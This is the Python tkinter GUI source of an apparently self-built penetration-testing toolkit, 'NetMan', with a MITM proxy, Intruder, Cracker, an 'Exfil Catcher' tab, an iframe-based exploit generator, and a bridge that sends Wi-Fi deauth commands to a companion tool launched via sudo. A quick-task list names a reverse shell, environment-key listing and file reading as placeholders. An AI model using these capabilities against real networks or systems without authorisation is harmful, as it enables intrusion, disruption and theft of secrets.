#gui_test
import tkinter as tk
from tkinter import ttk
from tkinter import filedialog
from tkinter import messagebox
from tkinter import simpledialog
import os
import socket
import queue
import threading
import intruder_engine
import cracker_engine
import mitm_proxy
import re
import json
import ssl
import http_utils
import base64
from urllib import parse
import html
import browser
from scanner_engine import run_scan
import decoder_engine
import repeater_engine
import logger_engine
import interceptor_engine
import jwt_gui
import discovery_gui
import subprocess
import crawler_gui
import scraper_gui
import vuln_gui
import xss_gui
import api_gui
import idor_gui
import ai_gui
import ai_engine
import project_engine
import reporter_engine
import ssl_gui
import ws_gui
import tech_gui
import subdomain_gui
import auth_gui
import compliance_gui
from local_bridge import LocalBridge
import pcap_engine
import psutil

current_dir = os.path.dirname(os.path.abspath(__file__))
history_file_path = os.path.join(current_dir, "http_history.log")
active_scope = ""
current_target_os = "Unknown"
listen_global_var = None
intruder_response_db = {}
app_bridge = None
bridge_inbox = queue.Queue()
BRIDGE_AUTH_TOKEN = os.environ.get("WICRACK_NETMAN_BRIDGE_TOKEN", "wicrack-netman-local")

QUICK_TASKS = {
    "Select Task...": "",
    "Env: List Keys": "ENV_KEYS_CMD",
    "FS: Read File": "READ_FILE_CMD",
    "Python: Reverse Shell": "REV_SHELL_CMD",
    "Python: WhoAmI": "import os; print(os.getlogin())",
    "Python: List Dirs": "import os; print(os.listdir('.'))",
    "JS: Node Version": "process.version",
    "JS: List Files": "require('fs').readdirSync('.').join(', ')"
}

def b64_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_base64(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b64_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_base64(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b85_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_base85(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def b85_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_base85(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def url_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_url(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def url_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_url(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def html_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_html(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def html_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_html(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def hex_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_hex(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def hex_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_hex(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def binary_encode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.encode_binary(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def binary_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.decode_binary(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def inspect_bytes_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    result = decoder_engine.inspect_bytes(raw_text)
    decoder_output.delete("1.0", tk.END)
    decoder_output.insert("1.0", result)

def smart_decode_text():
    raw_text = decoder_input.get("1.0", tk.END).strip()
    if not raw_text:
        return
    compact_binary = "".join(ch for ch in raw_text if ch in "01")
    binaryish = re.sub(r"[\s,]|0b", "", raw_text)
    hexish = re.sub(r"[\s,:]|0x", "", raw_text.lower())
    if binaryish and set(binaryish) <= {"0", "1"} and len(compact_binary) % 8 == 0:
        binary_decode_text()
        return
    if hexish and set(hexish) <= set("0123456789abcdef") and len(hexish) % 2 == 0 and len(hexish) >= 4:
        hex_decode_text()
        return
    if re.search(r'%[0-9a-fA-F]{2}', raw_text):
        url_decode_text()
    elif re.search(r'&[a-zA-Z0-9#]+;', raw_text):
        html_decode_text()
    elif re.match(r'^[a-fA-F0-9]{32}$', raw_text):
        decoder_output.delete("1.0", tk.END)
        decoder_output.insert("1.0", "[-] This looks like an MD5 Hash. Right-click and 'Send to Cracker'.")
    elif re.match(r'^[A-Za-z0-9+/]+={0,2}$', raw_text):
        b64_decode_text()
    else:
        decoder_output.delete("1.0", tk.END)
        decoder_output.insert("1.0", "[-] Auto-detect failed. Please use a manual decoding button.")
                              
def load_selected_payload(event):
    selected_name = payload_dropdown.get()
    actual_payload = common_payloads.get(selected_name, "")
    exploit_payload_entry.delete(0, tk.END)
    exploit_payload_entry.insert(0, actual_payload)

def load_project_dialog():
    file_path = filedialog.askopenfilename(filetypes=[("NetMan Project", "*.nman")])
    if not file_path:
        return
        
    project_data, message = project_engine.load_project(file_path)
    if not project_data:
        messagebox.showerror("Load Failed", f"Could not load project: {message}")
        return

    global active_scope
    active_scope = project_data.get("scope", "")
    mitm_proxy.set_scope(active_scope)
    scope_entry.delete(0, tk.END)
    scope_entry.insert(0, active_scope)

    logger_engine.clear_log(history_file_path)
    logger_engine.append_log(history_file_path, project_data.get("history", ""))
    refresh_history()
    messagebox.showinfo("Success", message)

def import_pcap_dialog():
    file_path = filedialog.askopenfilename(
        filetypes=[("PCAP Files", "*.pcap *.pcapng"), ("All Files", "*.*")]
    )
    if not file_path:
        return

    replace_existing = messagebox.askyesno(
        "Import PCAP",
        "Replace current HTTP history with imported PCAP requests?\n"
        "Choose No to append instead.",
    )

    # 1) Try Wi-Fi event extraction first (best fit for monitor-mode captures).
    wifi_data, wifi_err = pcap_engine.extract_wifi_details_from_pcap(file_path)
    if wifi_data:
        if replace_existing:
            logger_engine.clear_log(history_file_path)

        for item in wifi_data:
            logger_engine.append_log(history_file_path, item.strip() + "\n==========\n")

        refresh_history()
        messagebox.showinfo("Wi-Fi Data Imported", f"Imported {len(wifi_data)} Wi-Fi event(s) from PCAP.")
        return

    # If Wi-Fi parse itself failed (e.g., missing scapy), surface that clearly.
    if wifi_err:
        messagebox.showerror("PCAP Import Failed", wifi_err)
        return

    # 2) Then try plain HTTP extraction (no TLS key file yet).
    requests, error_msg = pcap_engine.extract_http_requests_from_pcap(file_path)
    if requests:
        if replace_existing:
            logger_engine.clear_log(history_file_path)

        for req in requests:
            logger_engine.append_log(history_file_path, req.strip() + "\n==========\n")

        refresh_history()
        messagebox.showinfo("PCAP Imported", f"Imported {len(requests)} HTTP request(s) from PCAP.")
        return

    if error_msg and not error_msg.startswith("No HTTP requests"):
        messagebox.showerror("PCAP Import Failed", error_msg)
        return

    # 3) Only now offer TLS key log decryption as a last attempt.
    default_tls_keylog = "/home/kali/sslkeys.log"
    use_tls_keylog = messagebox.askyesno(
        "TLS Decryption",
        "No Wi-Fi events or plain HTTP requests were found.\n\n"
        "Do you want to try HTTPS decryption with a TLS key log file?",
    )
    if not use_tls_keylog:
        if error_msg:
            messagebox.showinfo("PCAP Import Summary", error_msg)
        else:
            messagebox.showinfo("PCAP Import Summary", "No importable Wi-Fi or HTTP data found in this PCAP.")
        return

    initial_dir = os.path.dirname(default_tls_keylog)
    initial_file = os.path.basename(default_tls_keylog)
    if os.path.exists(default_tls_keylog):
        initial_dir = os.path.dirname(default_tls_keylog)
        initial_file = os.path.basename(default_tls_keylog)

    tls_keylog_path = filedialog.askopenfilename(
        title="Select TLS Key Log File",
        filetypes=[("TLS Key Log", "*.log *.txt *.*"), ("All Files", "*.*")],
        initialdir=initial_dir,
        initialfile=initial_file,
    )

    if not tls_keylog_path:
        messagebox.showinfo("PCAP Import Summary", "TLS key log selection skipped.")
        return

    tls_requests, tls_error = pcap_engine.extract_http_requests_from_pcap(
        file_path,
        tls_keylog_path=tls_keylog_path,
    )

    if tls_error:
        messagebox.showerror("PCAP Import Failed", tls_error)
        return

    if not tls_requests:
        messagebox.showinfo("PCAP Import Summary", "No HTTP requests were recovered after TLS decryption.")
        return

    if replace_existing:
        logger_engine.clear_log(history_file_path)

    for req in tls_requests:
        logger_engine.append_log(history_file_path, req.strip() + "\n==========\n")

    refresh_history()
    messagebox.showinfo("PCAP Imported", f"Imported {len(tls_requests)} HTTP request(s) from decrypted TLS traffic.")

def get_current_skimmer_hits():
    hits = set()
    for item in intruder_results.get_children():
        vals = intruder_results.item(item)['values']
        if len(vals) > 6:
            hit_text = vals[6]
            if hit_text and hit_text not in ["None", "N/A"]:
                for sub_hit in hit_text.split(", "):
                    hits.add(sub_hit)
    return sorted(list(hits))

def preview_report():
    import reporter_engine
    import ai_gui
    
    hits = get_current_skimmer_hits()
    insights = ai_gui.ai_output.get("1.0", tk.END).strip()
    
    report_text = reporter_engine.generate_report_text(active_scope, hits, insights)
    
    preview_win = tk.Toplevel(app)
    preview_win.title("Report Preview")
    preview_win.geometry("700x600")
    
    txt = tk.Text(preview_win, padx=15, pady=15, font=("Consolas", 10))
    txt.insert("1.0", report_text)
    txt.config(state="disabled")
    txt.pack(fill=tk.BOTH, expand=True)
    
    close_btn = tk.Button(preview_win, text="Close Preview", command=preview_win.destroy, pady=5)
    close_btn.pack(fill=tk.X)

def export_report_dialog():
    import reporter_engine
    import ai_gui
    
    file_path = filedialog.asksaveasfilename(defaultextension=".md", filetypes=[("Markdown", "*.md")])
    if not file_path:
        return
        
    hits = get_current_skimmer_hits()
    insights = ai_gui.ai_output.get("1.0", tk.END).strip()
    report_text = reporter_engine.generate_report_text(active_scope, hits, insights)
    
    success, message = reporter_engine.save_report(file_path, report_text)
    if success:
        messagebox.showinfo("Success", message)
    else:
        messagebox.showerror("Export Failed", f"Could not export report: {message}")

def new_project_trigger():
    global active_scope
    active_scope = ""
    mitm_proxy.set_scope("")
    scope_entry.delete(0, tk.END)
    logger_engine.clear_log(history_file_path)
    refresh_history()

def copy_exploit_to_clipboard():
    content = exploit_output.get("1.0", tk.END).strip()
    if content:
        app.clipboard_clear()
        app.clipboard_append(content)
        # Visual feedback: temporarily change button text
        exploit_copy_btn.config(text="Copied!", bg="gray")
        app.after(1000, lambda: exploit_copy_btn.config(text="Copy to Clipboard", bg="darkblue"))

def generate_iframe():
    url = exploit_url_entry.get().strip()
    raw_payload = exploit_payload_entry.get().strip()
    encoding = transform_var.get()
    comment_style = comment_style_var.get()
    
    if not url:
        return
    if comment_style == "#":
        raw_payload = raw_payload.replace("--", "#")
    if encoding == "Base64":
        final_payload = base64.b64encode(raw_payload.encode()).decode()
    elif encoding == "MD5 Hash":
        import hashlib
        final_payload = hashlib.md5(raw_payload.encode()).hexdigest()
    else:
        final_payload = parse.quote(raw_payload, safe='/:?=&#')
    if not url.startswith("http"):
        url = "https://" + url
        
    full_target = f"{url}{final_payload}"
    iframe_code = f"<iframe src=\"{full_target}\" width='500' height='300'></iframe>"
    exploit_output.delete("1.0", tk.END)
    exploit_output.insert("1.0", iframe_code)

def save_project_dialog():
    file_path = filedialog.asksaveasfilename(defaultextension=".nman", filetypes=[("NetMan Project", "*.nman")])
    if not file_path:
        return
        
    history_data = logger_engine.read_log(history_file_path)
    
    project_payload = {
        "scope": active_scope,
        "history": history_data
    }
    
    import project_engine
    success, message = project_engine.save_project(file_path, project_payload)
    if success:
        messagebox.showinfo("Success", message)
    else:
        messagebox.showerror("Save Failed", f"Could not save project: {message}")

def start_port_scan():
    target_ip = scanner_target_entry.get().strip()
    raw_ports = scanner_ports_entry.get().strip()
    raw_timeout = scanner_timeout_entry.get().strip()
    if not target_ip or not raw_ports:
        scanner_output.insert(tk.END, "Error: Target IP and Ports are required.\n")
        return
    scanner_output.delete("1.0", tk.END)
    scanner_output.insert(tk.END, f"Initiating scan on {target_ip}...\n\n")
    scanner_btn.config(state="disabled")
    def worker():
        try:
            results = run_scan(target_ip, raw_ports, float(raw_timeout))
            if results:
                message = f"\n[+] Open Ports found: {results}\nScan Complete.\n"
            else:
                message = "\n[-] No Open Ports Found.\nScan Complete.\n"
            app.after(0, lambda: scanner_output.insert(tk.END, message))
        except Exception as e:
            app.after(0, lambda: scanner_output.insert(tk.END, f"\nError: {e}\n"))
        finally:
            app.after(0, lambda: scanner_btn.config(state="normal"))
    threading.Thread(target=worker, daemon=True).start()    

def _bridge_callback(message):
    bridge_inbox.put(message)

def _bridge_status_callback(status):
    bridge_inbox.put({"_bridge_status": status})

def _set_bridge_status(status):
    if "bridge_status_value" not in globals():
        return

    if status == "connected":
        bridge_status_value.config(text="Connected", fg="#00c853")
    elif status == "connecting":
        bridge_status_value.config(text="Connecting", fg="#e0a800")
    elif status == "listening":
        bridge_status_value.config(text="Listening", fg="#e0a800")
    elif status == "offline":
        bridge_status_value.config(text="Offline", fg="#c62828")
    else:
        bridge_status_value.config(text="Disconnected", fg="#c62828")

def init_app_bridge():
    global app_bridge
    app_bridge = LocalBridge(
        "netman",
        on_message=_bridge_callback,
        on_status=_bridge_status_callback,
        auth_token=BRIDGE_AUTH_TOKEN,
    )
    return app_bridge.start()

def reconnect_app_bridge(silent=False):
    global app_bridge
    if app_bridge is None:
        ok = init_app_bridge()
    else:
        ok = app_bridge.reconnect()

    if ok and not silent and "exfil_text" in globals():
        exfil_text.insert(tk.END, "[BRIDGE] Reconnected to WiCrack bridge.\n")
        exfil_text.see(tk.END)

    if (not ok) and (not silent) and "exfil_text" in globals():
        exfil_text.insert(tk.END, "[BRIDGE] Reconnect attempt failed.\n")
        exfil_text.see(tk.END)

    return ok

def bridge_watchdog():
    if app_bridge is not None and not app_bridge.connected:
        reconnect_app_bridge(silent=True)
    app.after(5000, bridge_watchdog)

def check_bridge_queue():
    try:
        while True:
            message = bridge_inbox.get_nowait()
            if isinstance(message, dict) and "_bridge_status" in message:
                _set_bridge_status(message["_bridge_status"])
                continue
            process_bridge_message(message)
    except queue.Empty:
        pass
    app.after(700, check_bridge_queue)

def process_bridge_message(message):
    source = message.get("source", "unknown")
    if source == "netman":
        return

    event_type = message.get("type", "")
    payload = message.get("payload", {})

    if "exfil_text" not in globals():
        return

    if event_type == "bridge.hello":
        peer = payload.get("app", source)
        exfil_text.insert(tk.END, f"[BRIDGE] Peer online: {peer}\n")
    elif event_type == "wicrack.scan.started":
        capture = payload.get("capture", "unknown")
        exfil_text.insert(tk.END, f"[WICRACK] Scan started. Capture: {capture}\n")
    elif event_type == "wicrack.scan.stopped":
        exfil_text.insert(tk.END, "[WICRACK] Scan stopped.\n")
    elif event_type == "wicrack.client.seen":
        client = payload.get("client", "?")
        vendor = payload.get("vendor", "Unknown")
        bssid = payload.get("bssid", "?")
        seen = payload.get("seen", 1)
        exfil_text.insert(
            tk.END,
            f"[WICRACK] Client {client} ({vendor}) on {bssid} [seen={seen}]\n",
        )
    elif event_type == "wicrack.deauth.started":
        client = payload.get("client", "?")
        bssid = payload.get("bssid", "?")
        exfil_text.insert(tk.END, f"[WICRACK] Deauth launched for {client} on {bssid}\n")
    else:
        exfil_text.insert(tk.END, f"[BRIDGE] {source}: {event_type}\n")

    exfil_text.see(tk.END)

def send_deauth_to_wicrack():
    if app_bridge is None:
        messagebox.showerror("Bridge Offline", "Bridge is not initialized.")
        return

    if not app_bridge.connected and not reconnect_app_bridge(silent=True):
        messagebox.showerror("Bridge Error", "Bridge is disconnected and reconnect failed.")
        return

    client_mac = wicrack_client_entry.get().strip().lower()
    bssid = wicrack_bssid_entry.get().strip().lower()
    if not client_mac or not bssid:
        messagebox.showerror("Missing Fields", "Provide both client MAC and AP BSSID.")
        return

    ok = app_bridge.send(
        "netman.command.deauth",
        {
            "client": client_mac,
            "bssid": bssid,
        },
    )
    if ok:
        exfil_text.insert(tk.END, f"[BRIDGE] Sent deauth command for {client_mac} on {bssid}\n")
        exfil_text.see(tk.END)
    else:
        messagebox.showerror("Bridge Error", "Could not send command to WiCrack.")


def launch_wicrack_from_netman():
    wicrack_script = "/home/kali/WiCrack/main.py"
    venv_python = os.path.join(current_dir, ".venv", "bin", "python")
    wicrack_cwd = "/home/kali/WiCrack"
    launch_log_path = "/tmp/wicrack_launch.log"

    if not os.path.exists(wicrack_script):
        messagebox.showerror("Launch Failed", f"WiCrack entrypoint not found:\n{wicrack_script}")
        return

    if not os.path.exists(venv_python):
        messagebox.showerror("Launch Failed", f"Python interpreter not found:\n{venv_python}")
        return

    password = simpledialog.askstring(
        "Launch WiCrack (sudo)",
        "Enter sudo password to launch WiCrack:",
        show="*",
    )
    if password is None:
        return

    auth_check = subprocess.run(
        ["sudo", "-S", "-k", "-p", "", "true"],
        input=password + "\n",
        text=True,
        capture_output=True,
    )
    if auth_check.returncode != 0:
        messagebox.showerror("Launch Failed", "Sudo authentication failed. Please verify your password.")
        return

    # Allow root-owned GUI process to connect to X for this user session.
    try:
        subprocess.run(
            ["xhost", "+SI:localuser:root"],
            capture_output=True,
            text=True,
            check=False,
        )
    except Exception:
        pass

    launch_cmd = [
        "sudo",
        "-S",
        "-p",
        "",
        "-E",
        "env",
        f"DISPLAY={os.environ.get('DISPLAY', '')}",
        f"XAUTHORITY={os.environ.get('XAUTHORITY', '')}",
        venv_python,
        wicrack_script,
    ]

    try:
        log_handle = open(launch_log_path, "a", encoding="utf-8")
        log_handle.write("\n=== WiCrack launch attempt ===\n")
        proc = subprocess.Popen(
            launch_cmd,
            cwd=wicrack_cwd,
            stdin=subprocess.PIPE,
            stdout=log_handle,
            stderr=log_handle,
            text=True,
        )
        # Feed sudo password to this exact launch command; do not persist it.
        if proc.stdin is not None:
            proc.stdin.write(password + "\n")
            proc.stdin.flush()
            proc.stdin.close()
        log_handle.close()
    except Exception as e:
        messagebox.showerror("Launch Failed", f"Could not start WiCrack: {e}")
        return

    def _confirm_wicrack_started():
        running = subprocess.run(
            ["pgrep", "-af", "WiCrack/main.py"],
            capture_output=True,
            text=True,
            check=False,
        )
        is_running = bool((running.stdout or "").strip())

        if "exfil_text" in globals():
            if is_running:
                exfil_text.insert(tk.END, "[WICRACK] Process detected and running.\n")
            else:
                exfil_text.insert(
                    tk.END,
                    f"[WICRACK] Launch command finished but process is not running. Check log: {launch_log_path}\n",
                )
            exfil_text.see(tk.END)

    if "exfil_text" in globals():
        exfil_text.insert(tk.END, "[WICRACK] Launch requested from NetMan via sudo.\n")
        exfil_text.insert(tk.END, "[BRIDGE] Scheduling quick reconnect checks...\n")
        exfil_text.see(tk.END)

    # Bridge watchdog already retries every 5 seconds; this speeds up the first connect.
    app.after(1500, lambda: reconnect_app_bridge(silent=True))
    app.after(3500, lambda: reconnect_app_bridge(silent=True))
    app.after(2500, _confirm_wicrack_started)
    messagebox.showinfo("WiCrack Launch", "WiCrack launch command sent.")

def on_app_close():
    if app_bridge is not None:
        app_bridge.stop()
    app.destroy()

app = tk.Tk()
listen_global_var = tk.BooleanVar(value=False)
right_click_menu = tk.Menu(app, tearoff=0)
right_click_menu.add_command(label="Copy", command=lambda: (fw := app.focus_get()) and fw.event_generate("<<Copy>>"))
right_click_menu.add_command(label="Paste", command=lambda: (fw := app.focus_get()) and fw.event_generate("<<Paste>>"))
right_click_menu.add_separator()
right_click_menu.add_command(label="Send to Repeater", command=lambda: send_to_repeater(app.focus_get()))
right_click_menu.add_command(label="Send to Intruder", command=lambda: send_to_intruder(app.focus_get()))
right_click_menu.add_command(label="Send to Decoder", command=lambda: send_to_decoder(app.focus_get()))
right_click_menu.add_command(label="Send to Cracker", command=lambda: send_to_cracker(app.focus_get()))
right_click_menu.add_command(label="Send to AI", command=lambda: send_to_ai(app.focus_get()))

def show_right_click_menu(event):
    try:
        event.widget.focus_set()
        right_click_menu.tk_popup(event.x_root, event.y_root)
    finally:
        right_click_menu.grab_release()

app.bind_class("Text", "<Button-3>", show_right_click_menu)
app.bind_class("Entry", "<Button-3>", show_right_click_menu)

app.title("NetMan")
app.geometry("1000x700")
app.minsize(1000, 680)
app.resizable(True, True)
main_menu = tk.Menu(app)
app.config(menu=main_menu)

# --- Resource monitor bar (CPU / RAM / Network) ---
_net_last = psutil.net_io_counters()
_net_last_time = [0.0]

resmon_frame = tk.Frame(app, bg="#1a1a1a", pady=2)
resmon_frame.pack(fill="x", side="top")

tk.Label(resmon_frame, text="CPU:", bg="#1a1a1a", fg="#aaaaaa", font=("Consolas", 9)).pack(side="left", padx=(8, 0))
cpu_label = tk.Label(resmon_frame, text="--%", bg="#1a1a1a", fg="#00e676", font=("Consolas", 9, "bold"), width=6)
cpu_label.pack(side="left", padx=(0, 10))

tk.Label(resmon_frame, text="RAM:", bg="#1a1a1a", fg="#aaaaaa", font=("Consolas", 9)).pack(side="left")
ram_label = tk.Label(resmon_frame, text="--%", bg="#1a1a1a", fg="#40c4ff", font=("Consolas", 9, "bold"), width=6)
ram_label.pack(side="left", padx=(0, 10))

tk.Label(resmon_frame, text="NET ↑:", bg="#1a1a1a", fg="#aaaaaa", font=("Consolas", 9)).pack(side="left")
net_up_label = tk.Label(resmon_frame, text="-- KB/s", bg="#1a1a1a", fg="#ff6d00", font=("Consolas", 9, "bold"), width=10)
net_up_label.pack(side="left", padx=(0, 4))

tk.Label(resmon_frame, text="↓:", bg="#1a1a1a", fg="#aaaaaa", font=("Consolas", 9)).pack(side="left")
net_down_label = tk.Label(resmon_frame, text="-- KB/s", bg="#1a1a1a", fg="#ff6d00", font=("Consolas", 9, "bold"), width=10)
net_down_label.pack(side="left", padx=(0, 10))

def _fmt_rate(bps):
    if bps >= 1_000_000:
        return f"{bps/1_000_000:.1f} MB/s"
    return f"{bps/1_000:.0f} KB/s"

def _color_cpu(pct):
    if pct >= 85:
        return "#ff1744"
    if pct >= 60:
        return "#ffab00"
    return "#00e676"

def _color_ram(pct):
    if pct >= 85:
        return "#ff1744"
    if pct >= 70:
        return "#ffab00"
    return "#40c4ff"

def _update_resmon():
    global _net_last, _net_last_time
    import time
    now = time.monotonic()
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    net = psutil.net_io_counters()
    elapsed = now - _net_last_time[0] if _net_last_time[0] else 1.0
    up_rate = (net.bytes_sent - _net_last.bytes_sent) / max(elapsed, 0.1)
    dn_rate = (net.bytes_recv - _net_last.bytes_recv) / max(elapsed, 0.1)
    _net_last = net
    _net_last_time[0] = now
    cpu_label.config(text=f"{cpu:.0f}%", fg=_color_cpu(cpu))
    ram_label.config(text=f"{ram:.0f}%", fg=_color_ram(ram))
    net_up_label.config(text=_fmt_rate(up_rate))
    net_down_label.config(text=_fmt_rate(dn_rate))
    app.after(1500, _update_resmon)

app.after(500, _update_resmon)

file_menu = tk.Menu(main_menu, tearoff=0)
main_menu.add_cascade(label="Project", menu=file_menu)
file_menu.add_command(label="New Project", command=new_project_trigger)
file_menu.add_command(label="Save Project As...", command=save_project_dialog)
file_menu.add_command(label="Load Project...", command=load_project_dialog)
file_menu.add_command(label="Import PCAP...", command=import_pcap_dialog)
file_menu.add_separator()
file_menu.add_command(label="Preview Report", command=preview_report)
file_menu.add_command(label="Export Report (.md)", command=export_report_dialog)
file_menu.add_separator()
file_menu.add_command(label="Exit", command=on_app_close)

tab_control = ttk.Notebook(app)

history_tab = ttk.Frame(tab_control)
repeater_tab = ttk.Frame(tab_control)
intruder_tab = ttk.Frame(tab_control)
decoder_tab = ttk.Frame(tab_control)
cracker_tab = ttk.Frame(tab_control)
exfil_tab = ttk.Frame(tab_control)
exploit_tab = ttk.Frame(tab_control)
scanner_tab = ttk.Frame(tab_control)
intercept_tab = ttk.Frame(tab_control)

tab_control.add(history_tab, text="HTTP History")
tab_control.add(repeater_tab, text="Repeater")
tab_control.add(intruder_tab, text="Intruder")
tab_control.add(decoder_tab, text="Decoder")
tab_control.add(cracker_tab, text="Cracker")
tab_control.add(exfil_tab, text="Exfil Catcher")
tab_control.add(exploit_tab, text="Exploit Gen")
tab_control.add(scanner_tab, text="Port Scanner")
tab_control.add(intercept_tab, text="Interceptor")
jwt_gui.build_jwt_tab(tab_control)
discovery_gui.build_discovery_tab(tab_control)
crawler_gui.build_crawler_tab(tab_control)
scraper_gui.build_scraper_tab(tab_control)
vuln_gui.build_vuln_tab(tab_control)
xss_gui.build_xss_tab(tab_control)
api_gui.build_api_tab(tab_control)
idor_gui.build_idor_tab(tab_control)
ai_tab = ai_gui.build_ai_tab(tab_control)
ssl_gui.build_ssl_tab(tab_control)
ws_gui.build_ws_tab(tab_control)
tech_gui.build_tech_tab(tab_control)
subdomain_gui.build_subdomain_tab(tab_control)
auth_gui.build_auth_tab(tab_control)
compliance_gui.build_compliance_tab(tab_control)

decoder_pane = tk.PanedWindow(decoder_tab, orient=tk.VERTICAL)
decoder_pane.pack(expand=1, fill="both")

decoder_input = tk.Text(decoder_pane, height=10)
decoder_pane.add(decoder_input)

decoder_controls = tk.Frame(decoder_pane)
decoder_pane.add(decoder_controls)

smart_decode_btn = tk.Button(decoder_controls, text="Smart Decode (Auto)", command=smart_decode_text, bg="lightblue")
smart_decode_btn.pack(side=tk.LEFT, padx=5, pady=5)

btn_b64_encode = tk.Button(decoder_controls, text="Base64 Encode", command=b64_encode_text)
btn_b64_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b64_decode = tk.Button(decoder_controls, text="Base64 Decode", command=b64_decode_text)
btn_b64_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b85_encode = tk.Button(decoder_controls, text="Base85 Encode", command=b85_encode_text)
btn_b85_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_b85_decode = tk.Button(decoder_controls, text="Base85 Decode", command=b85_decode_text)
btn_b85_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_hex_encode = tk.Button(decoder_controls, text="Hex Encode", command=hex_encode_text)
btn_hex_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_hex_decode = tk.Button(decoder_controls, text="Hex Decode", command=hex_decode_text)
btn_hex_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_bin_encode = tk.Button(decoder_controls, text="Binary Encode", command=binary_encode_text)
btn_bin_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_bin_decode = tk.Button(decoder_controls, text="Binary Decode", command=binary_decode_text)
btn_bin_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_url_encode = tk.Button(decoder_controls, text="URL Encode", command=url_encode_text)
btn_url_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_url_decode = tk.Button(decoder_controls, text="URL Decode", command=url_decode_text)
btn_url_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_html_encode = tk.Button(decoder_controls, text="HTML Encode", command=html_encode_text)
btn_html_encode.pack(side=tk.LEFT, padx=5, pady=5)

btn_html_decode = tk.Button(decoder_controls, text="HTML Decode", command=html_decode_text)
btn_html_decode.pack(side=tk.LEFT, padx=5, pady=5)

btn_byte_inspect = tk.Button(decoder_controls, text="Byte Inspector", command=inspect_bytes_text, bg="#3949ab", fg="white")
btn_byte_inspect.pack(side=tk.LEFT, padx=5, pady=5)

decoder_output = tk.Text(decoder_pane, height=10)
decoder_pane.add(decoder_output)

tab_control.pack(expand=1, fill="both")

def toggle_intercept():
    is_now_enabled = interceptor_engine.toggle()
    if is_now_enabled:
        intercept_btn.config(text="Intercept is On", bg="orange")
    else:
        intercept_btn.config(text="Intercept is Off", bg="lightgray")

def forward_request():
    edited_data = intercept_text.get("1.0", "end-1c")
    interceptor_engine.forward_request(edited_data)

def drop_request():
    interceptor_engine.drop_request()
    intercept_text.delete("1.0", tk.END)

HTTP_METHODS = {
    "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "CONNECT"
}

def parse_history_request_summary(raw_request):
    lines = [line.strip() for line in raw_request.splitlines() if line.strip()]

    method = "N/A"
    for line in lines:
        if line.upper().startswith("[TARGET:"):
            continue
        parts = line.split()
        if parts and parts[0].upper() in HTTP_METHODS:
            method = parts[0].upper()
            break

    host = "Unknown"
    for line in lines:
        if line.lower().startswith("host:"):
            host = line.split(":", 1)[1].strip()
            break

    if host == "Unknown":
        for line in lines:
            if line.upper().startswith("[TARGET:") and line.endswith("]"):
                host = line[len("[TARGET:"):-1].strip()
                break

    return method, host

def split_history_entries(content):
    normalized = content.replace("\r\n", "\n")
    return [entry.strip() for entry in normalized.split("==========\n") if entry.strip()]

def refresh_history():
    for item in history_tree.get_children():
        history_tree.delete(item)
    if not os.path.exists(history_file_path):
        return
    with open(history_file_path, "r", encoding="utf-8") as f:
        content = f.read()
    requests = split_history_entries(content)
    req_id = 1
    for req in requests:
        method, host = parse_history_request_summary(req)
        history_tree.insert('', 'end', values=(req_id, method, host, len(req)))
        req_id += 1

def launch_proxy_thread():
    if proxy_btn.cget("text") == "Start MITM Proxy":
        is_global = listen_global_var.get() if listen_global_var is not None else False
        proxy_thread = threading.Thread(target=mitm_proxy.start_proxy, args=(8080, is_global), daemon=True)
        proxy_thread.start()
        proxy_btn.config(text="Stop MITM Proxy", bg="red")
        browser.launch_firefox()
    else:
        mitm_proxy.stop_proxy()
        proxy_btn.config(text="Start MITM Proxy", bg="darkred", fg="white")

def view_request(event):
